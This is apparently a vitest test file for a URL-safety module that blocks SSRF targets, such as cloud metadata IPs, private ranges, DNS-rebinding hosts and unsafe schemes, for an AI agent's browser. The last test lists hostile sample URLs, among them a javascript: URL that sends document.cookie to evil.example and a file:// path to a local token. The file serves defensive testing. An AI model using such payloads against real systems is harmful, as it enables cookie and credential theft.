// Copyright © 2024-2026 XAGI Labs Private Limited. All rights reserved.
// This software is proprietary. Copying or reuse is prohibited.
// See LICENSE.md for details.

import dns from "node:dns/promises";
import { afterEach, describe, expect, it, vi } from "vitest";
import { isAlwaysBlockedUrl, isSafeUrl, unsafeBrowserUrl } from "./url-safety.js";

function mockLookup(addresses: Array<{ address: string; family: number }>): void {
    vi.spyOn(dns, "lookup").mockResolvedValue(addresses as never);
}

function mockLookupReject(): void {
    vi.spyOn(dns, "lookup").mockRejectedValue(new Error("ENOTFOUND") as never);
}

afterEach(() => {
    vi.restoreAllMocks();
});

describe("isAlwaysBlockedUrl — cloud-metadata floor", () => {
    it("blocks AWS/GCP/Azure IMDS 169.254.169.254", () => {
        expect(isAlwaysBlockedUrl("http://169.254.169.254/latest/meta-data/")).toBe(true);
    });

    it("blocks the full metadata IP set", () => {
        for (const ip of ["169.254.170.2", "169.254.169.253", "100.100.100.200"]) {
            expect(isAlwaysBlockedUrl(`http://${ip}/`)).toBe(true);
        }
    });

    it("blocks fd00:ec2::254 (AWS IMDS over IPv6)", () => {
        expect(isAlwaysBlockedUrl("http://[fd00:ec2::254]/")).toBe(true);
    });

    it("blocks ::ffff: mapped metadata IP", () => {
        expect(isAlwaysBlockedUrl("http://[::ffff:169.254.169.254]/")).toBe(true);
    });

    it("blocks metadata hostnames", () => {
        for (const h of ["metadata.google.internal", "metadata.goog", "instance-data", "metadata.azure.com"]) {
            expect(isAlwaysBlockedUrl(`http://${h}/`)).toBe(true);
        }
    });

    it("does not block a public host", () => {
        expect(isAlwaysBlockedUrl("https://example.com/")).toBe(false);
    });

    it("returns false on an invalid URL rather than throwing", () => {
        expect(isAlwaysBlockedUrl("not a url")).toBe(false);
    });
});

describe("isSafeUrl — scheme rejection", () => {
    it("rejects file://", async () => {
        expect((await isSafeUrl("file:///etc/passwd")).safe).toBe(false);
    });

    it("rejects ftp://", async () => {
        expect((await isSafeUrl("ftp://example.com/x")).safe).toBe(false);
    });

    it("rejects gopher:// and data:", async () => {
        expect((await isSafeUrl("gopher://example.com/")).safe).toBe(false);
        expect((await isSafeUrl("data:text/plain,hi")).safe).toBe(false);
    });

    it("rejects a malformed URL", async () => {
        expect((await isSafeUrl("http://")).safe).toBe(false);
    });
});

describe("isSafeUrl — literal private IPs", () => {
    it("blocks all RFC1918 / loopback / link-local / CGNAT ranges", async () => {
        const blocked = [
            "http://10.0.0.1/",
            "http://127.0.0.1/",
            "http://169.254.169.254/",
            "http://172.16.5.5/",
            "http://192.168.1.1/",
            "http://100.64.0.1/",
            "http://0.0.0.0/",
        ];
        for (const u of blocked) {
            expect((await isSafeUrl(u)).safe).toBe(false);
        }
    });

    it("blocks IPv6 loopback and ULA literals", async () => {
        expect((await isSafeUrl("http://[::1]/")).safe).toBe(false);
        expect((await isSafeUrl("http://[fd00::1]/")).safe).toBe(false);
        expect((await isSafeUrl("http://[fe80::1]/")).safe).toBe(false);
    });

    it("blocks ::ffff: mapped private IPv4 literals", async () => {
        expect((await isSafeUrl("http://[::ffff:127.0.0.1]/")).safe).toBe(false);
        expect((await isSafeUrl("http://[::ffff:10.0.0.1]/")).safe).toBe(false);
    });

    it("blocks localhost without DNS", async () => {
        expect((await isSafeUrl("http://localhost:8080/")).safe).toBe(false);
    });

    it("blocks .internal and .local suffixes", async () => {
        expect((await isSafeUrl("http://db.internal/")).safe).toBe(false);
        expect((await isSafeUrl("http://printer.local/")).safe).toBe(false);
    });
});

describe("isSafeUrl — DNS resolution", () => {
    it("allows a public host that resolves to a public address", async () => {
        mockLookup([{ address: "93.184.216.34", family: 4 }]);
        expect((await isSafeUrl("https://example.com/")).safe).toBe(true);
    });

    it("blocks a public-looking host that resolves to a private address (DNS rebinding)", async () => {
        mockLookup([{ address: "10.0.0.5", family: 4 }]);
        const r = await isSafeUrl("https://evil.example.com/");
        expect(r.safe).toBe(false);
        expect(r.reason).toMatch(/10\.0\.0\.5/);
    });

    it("blocks if ANY resolved address is private", async () => {
        mockLookup([
            { address: "93.184.216.34", family: 4 },
            { address: "169.254.169.254", family: 4 },
        ]);
        expect((await isSafeUrl("https://mixed.example.com/")).safe).toBe(false);
    });

    it("blocks a host resolving to a private IPv6 address", async () => {
        mockLookup([{ address: "fd00::1234", family: 6 }]);
        expect((await isSafeUrl("https://v6.example.com/")).safe).toBe(false);
    });

    it("fails closed when DNS resolution errors", async () => {
        mockLookupReject();
        const r = await isSafeUrl("https://nonexistent.example.com/");
        expect(r.safe).toBe(false);
        expect(r.reason).toMatch(/DNS lookup failed/);
    });
});

describe("unsafeBrowserUrl: every way the agent opens a URL", () => {
    it("allows web pages and the blank page only", () => {
        expect(unsafeBrowserUrl("https://example.com/a?b=1")).toBeNull();
        expect(unsafeBrowserUrl("http://localhost:3000")).toBeNull(); // dev servers in coding demos
        expect(unsafeBrowserUrl("about:blank")).toBeNull();
        for (const bad of [
            "file:///Users/me/.atlas/overlay-local-token",
            "javascript:fetch('https://evil.example/?c='+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "chrome://settings",
        ])
            expect(unsafeBrowserUrl(bad), bad).toMatch(/unsafe URL scheme/);
        expect(unsafeBrowserUrl("not a url")).toMatch(/invalid url/);
    });
});
